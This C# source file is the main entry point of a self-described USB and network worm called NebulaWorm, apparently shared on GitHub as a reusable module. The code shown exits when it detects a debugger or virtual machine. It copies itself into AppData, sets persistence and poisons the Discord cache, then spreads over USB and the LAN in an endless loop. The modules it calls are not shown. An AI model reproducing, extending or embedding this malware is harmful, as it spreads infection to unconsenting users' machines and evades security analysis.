using System;
using System.Threading;

namespace NebulaWorm
{
    internal static class Program
    {
        private static Random rnd = new Random();

        [STAThread]
        static void Main()
        {
            try
            {
              
                if (AntiDebug.IsDebuggedOrVM())
                    return;

                SelfReplicator.CopyToAppDataIfNeeded();

                Persistence.Apply();

            
                SlowWi.Start();

             
                Discord.PoisonCache();
     
                UsbSpread.Spread();

            
                while (true)
                {
                 
                    UsbSpread.Spread();
                   LanSpread.SpreadAsync();
                    SelfReplicator.CopyToAppDataIfNeeded();
                    Discord.PoisonCache();
            
                    int delay = rnd.Next(1, 5) * 60 * 120;
                    Thread.Sleep(delay);
                }
            }
            catch
            {
              
            }
        }
    }
}
// made by github.com/keegan31 C# NET-USB Worm
// this worm is can be easily modified or added to another Project As A Module
//every code is simple lines of code Has Anti VM Anti Debugger